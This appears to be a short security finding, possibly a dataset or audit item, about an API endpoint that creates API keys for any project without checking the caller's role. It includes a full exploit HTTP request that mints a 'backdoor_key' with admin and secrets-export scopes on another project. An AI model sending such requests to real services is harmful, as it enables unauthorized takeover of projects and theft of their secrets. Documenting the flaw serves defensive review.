diagnosis: The endpoint provisions a new API key with requested privileges for any project_id without verifying that current_user has administrative or project owner roles on project_id. An attacker can generate API keys with full access scopes on target projects.
exploit_request:
POST /api/v1/projects/8821/api-keys HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"name": "backdoor_key", "scopes": ["admin:read", "admin:write", "secrets:export"]}
